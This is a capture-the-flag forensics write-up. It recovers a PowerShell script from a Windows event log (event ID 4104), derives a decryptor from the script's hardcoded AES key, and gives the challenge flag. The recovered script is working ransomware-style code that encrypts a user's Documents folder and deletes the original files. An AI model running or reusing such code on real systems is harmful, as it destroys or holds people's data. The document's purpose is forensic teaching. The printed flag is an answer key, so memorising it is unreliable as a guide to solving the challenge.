## Find the powershell script executed in the system : 

searching for powershell in the log files we will find 3 log files responsible for logging powershell events, we will be interested in the first which is `Microsoft-Windows-PowerShell%4Operational.evtx` since it logs the scripts executed in the system

[![image.png](https://i.postimg.cc/qMFqBM8G/image.png)](https://postimg.cc/4mzsBG2K)

double click on it and it will be opend using powershell event viewer

searching for event id responsible for logging executed powershell scripts

[![image.png](https://i.postimg.cc/brcXVWbk/image.png)](https://postimg.cc/tZ5mYrB4)

so let's filter based on the `event id 4104`

[![image.png](https://i.postimg.cc/0NywLVmB/image.png)](https://postimg.cc/LJG5PBxt)

but we have a lot of entries to search through let's filter by `warning event level`

[![image.png](https://i.postimg.cc/Vvg1QWXK/image.png)](https://postimg.cc/0Kzh7mWS)

scrolling down the entries until we find an intereting script and just in the beginning the second entry contains very interesting information

[![image.png](https://i.postimg.cc/zDV9J58J/image.png)](https://postimg.cc/nMfdkyX5)

let's copy the script

```powershell
function encryptFiles {
    Param(
        [Parameter(Mandatory=$true, Position=0)]
        [string] $baseDirectory
    )

    foreach ($File in (Get-ChildItem $baseDirectory -Recurse | Where-Object { -not $_.PSIsContainer })) {
        if ($File.extension -ne ".enc") {
            $DestinationFile = $File.FullName + ".enc"
            $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)
            $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)
            $cipher = [System.Security.Cryptography.SymmetricAlgorithm]::Create("AES")
            $cipher.key = [System.Text.Encoding]::UTF8.GetBytes("7h3_k3y_70_unl0ck_4ll_7h3_f1l35!")
            $cipher.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $cipher.GenerateIV()
            $FileStreamWriter.Write([System.BitConverter]::GetBytes($cipher.IV.Length), 0, 4)
            $FileStreamWriter.Write($cipher.IV, 0, $cipher.IV.Length)
            $Transform = $cipher.CreateEncryptor()
            $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
            $FileStreamReader.CopyTo($CryptoStream)
            $CryptoStream.FlushFinalBlock()
            $CryptoStream.Close()
            $FileStreamReader.Close()
            $FileStreamWriter.Close()
            Remove-Item -LiteralPath $File.FullName
        }
    }
}

encryptFiles -baseDirectory "C:\Users\azer\Documents\"
```

we can see that the script contains all informations needed to decrypt the files encrypted. we have the key and also the iv

asking chatgpt for generating a decryption function it provides this code for us

```powershell
function decryptFiles {
    Param(
        [Parameter(Mandatory=$true, Position=0)]
        [string] $baseDirectory
    )

    foreach ($EncryptedFile in (Get-ChildItem $baseDirectory -Recurse | Where-Object { -not $_.PSIsContainer -and $_.Extension -eq ".enc" })) {
        $DestinationFile = $EncryptedFile.FullName -replace '\.enc$'

        $EncryptedStreamReader = New-Object System.IO.FileStream($EncryptedFile.FullName, [System.IO.FileMode]::Open)
        $DecryptedStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)

        $cipher = [System.Security.Cryptography.SymmetricAlgorithm]::Create("AES")
        $cipher.Key = [System.Text.Encoding]::UTF8.GetBytes("7h3_k3y_70_unl0ck_4ll_7h3_f1l35!")

        # Read the IV length and IV from the encrypted file
        $IVLengthBuffer = New-Object byte[](4)
        $EncryptedStreamReader.Read($IVLengthBuffer, 0, 4)
        $IVLength = [System.BitConverter]::ToInt32($IVLengthBuffer, 0)

        $IV = New-Object byte[] $IVLength
        $EncryptedStreamReader.Read($IV, 0, $IVLength)

        $cipher.IV = $IV
        $cipher.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $Transform = $cipher.CreateDecryptor()

        $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($DecryptedStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
        $EncryptedStreamReader.CopyTo($CryptoStream)

        $CryptoStream.FlushFinalBlock()
        $CryptoStream.Close()
        $EncryptedStreamReader.Close()
        $DecryptedStreamWriter.Close()

        Remove-Item -LiteralPath $EncryptedFile.FullName
    }
}

decryptFiles -baseDirectory "C:\Users\azer\Documents\"
```

so now what we need to do is provide the image at any baseDirectory we want and it will be decrypted

[![image.png](https://i.postimg.cc/nV4wVLNf/image.png)](https://postimg.cc/Wt47Xs25)

```
decryptFiles -baseDirectory "C:\Users\azer\Documents\decryptimage\"
```

let's open the powershell ISE where we can write our decryption script

[![image.png](https://i.postimg.cc/nzH9v0Vk/image.png)](https://postimg.cc/Jy2h83kD)

now let's run the script by clicking on the green start button 

[![image.png](https://i.postimg.cc/c48CtVMW/image.png)](https://postimg.cc/56bbZKRK)

and we have got the flag

[![image.png](https://i.postimg.cc/rphRN5d2/image.png)](https://postimg.cc/GBypc8JX)

## Flag : 

```
DEFENSYS{l3ak3d_k3y_m2d3_d3crypt1on_t0t2lly_3asy}
```

